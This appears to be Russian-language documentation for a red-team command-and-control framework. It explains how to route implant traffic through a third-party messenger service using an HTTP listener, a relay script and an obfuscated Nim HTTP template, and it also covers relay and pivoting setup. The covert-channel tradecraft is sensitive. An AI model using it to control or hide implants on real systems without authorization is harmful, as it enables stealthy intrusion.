## Как устроено

Чтобы собрать пользовательский канал, полезно понять, как стыкуются части. По сути, три опоры:

1. HTTP listener
2. Импланта с **Custom channel**
3. Пользовательский скрипт

Вместе они прокладывают путь между имплантой и сервером команды так, что импланта ходит в сеть только к выбранному вами авторизованному стороннему сервису.

### ( 2 ) Listener

Нужен настроенный HTTP listener. Можно обойтись API сервера команды, но в примерах для наглядности используем HTTP listener.

### ( 3 ) Пользовательский скрипт

Ключевой шаг: скрипт, который общается со сторонним сервисом и с listener — по сути «переводчик» между форматами.

### ( 4 ) Сторонняя платформа

Внешний канал связи, который вы выбрали.

### ( 5 ) Импланта

Импланта со встроенной на этапе сборки логикой обмена с этим сервисом.

## Поток обмена

Разберём сценарий с внешним мессенджером, похожим на Telegram.

  <Steps>
    <Step>
      Команда `whoami` попадает в очередь.
    </Step>
    <Step>
      Пользовательский скрипт в цикле каждые 5 секунд опрашивает listener и забирает команды. Найдя команду, отправляет запрос во внешний сервис, например:

      ```
      input | 938192 | whoami
      ```
    </Step>
    <Step>
      Во внешнем сервисе появляется сообщение с тем же содержимым.
    </Step>
    <Step>
      Импланта сама ходит во внешний сервис с нужными API-ключами и токенами. На каждом запросе проверяет, есть ли команда; если есть — выполняет.

      Затем отправляет результат во внешний сервис, например:

      ```
      output | 938192 | whoami | root
      ```
    </Step>
    <Step>
      На одном из проходов цикла скрипт видит вывод и шлёт запрос listener, имитируя импланту в формате [Implant API](/docs/rest-api/implants). После этого удаляет это сообщение из внешнего сервиса.
    </Step>
    <Step>
      Listener принимает запрос как трафик импланты и завершает обработку команды.
    </Step>
  </Steps>

## Пользовательский скрипт

Суть проста: вы пишете скрипт с циклом, который следит за внешним сервисом и пересылает данные на listener. Сложность растёт, если нужно дробить очень большие входы или выходы.

## Пользовательский канал

Импланту нужно собрать с логикой связи под выбранный сервис — часто это отдельная разработка с нуля.

При создании импланты откройте **Command and control** и в CHANNEL выберите **Custom channel**.

Появится текстовое поле с заготовкой кода:

```nim

# imports...

var customServerHost = obf("http://192.168.15.10:9090/")
const delaySeconds = 2
customCookies = toTable([
  (obf("session"), obf("example")),
  (obf("token"), obf("example")),
])
customHeaders = toTable([
  (obf("User-Agent"), obf("Mozilla/5.0")),
  (obf("X-Custom-Header"), obf("example")),
])

proc httpPost(
    url, payload: string;
    cookies: Table[string, string];
    headers: Table[string, string]
): tuple[code: uint16, body: string] =
  var pairs: seq[(string, string)] = @[(obf("Connection"), obf("close"))]
  for key, value in headers:
    pairs.add((key, value))
  var cookieParts: seq[string] = @[]
  for key, value in cookies:
    cookieParts.add(key & obf("=") & value)
  if cookieParts.len > 0:
    pairs.add((obf("Cookie"), cookieParts.join(obf("; "))))
  let r = nhttp.winHttpPerform(url, "POST", payload, pairs)
  (code: r.code, body: r.body)

# Rest of the code...
```

Это стандартный HTTP-обмен в процедурном виде — удобнее править под свои нужды. В сложных сценариях добавляют фрагментацию, шифрование и т. д.

## Relay и pivoting

Настройка неприятная, но необходимая. Рядом с вкладкой **Implant routine** есть **Relay forwarder** — логика исходящего relay.

У relay всегда есть последнее звено, которое отправляет трафик на сервер команды в виде HTTP и JSON. За это отвечает соответствующий блок кода. Для связки relay с пользовательским каналом его тоже нужно подогнать.

Часто достаточно адаптировать ту же логику, что в **Implant routine**, для **Relay forwarder**.

## Тесты, тесты, тесты

Сборка пользовательского канала может быть утомительной — перед боевым использованием прогоните всю цепочку. Каждая пересборка импланты с ошибкой в логике даст исключение, и отладка станет проще.
